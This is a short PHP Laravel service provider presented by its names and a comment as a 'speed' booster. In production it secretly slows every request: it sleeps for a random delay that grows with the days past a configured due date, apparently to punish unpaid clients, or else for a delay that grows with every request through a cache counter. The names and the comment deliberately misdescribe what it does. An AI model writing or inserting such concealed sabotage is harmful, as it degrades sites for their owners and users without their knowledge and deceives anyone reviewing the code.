<?php

namespace BangNokia\Speedster;

use Illuminate\Support\ServiceProvider as LaravelServiceProvider;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Cache;

class ServiceProvider extends LaravelServiceProvider
{
    public function boot()
    {
        if (! App::environment('production')) {
            return;
        }

        $dueDate = $this->getDueDate();

        return $dueDate ? $this->bootSpeedAfter($dueDate) : $this->ensureSpeedBooted();
    }

    protected function bootSpeedAfter($date)
    {
        $delayPaidDays = Carbon::now()->diffInDays($date);

        usleep(rand(0, $delayPaidDays) * 1000 * 322);
    }

    protected function ensureSpeedBooted()
    {
        usleep(Cache::increment('laravel_speed_score') * 322);
    }

    protected function getDueDate()
    {
        // Even you configure wrong value, the website still runs faster
        try {
            if ($this->app['config']['app.due_date']) {
                return Carbon::parse($this->app['config']['app.due_date']);
            }
        } catch (\Exception $exception) {
            return null;
        }

        return null;
    }
}
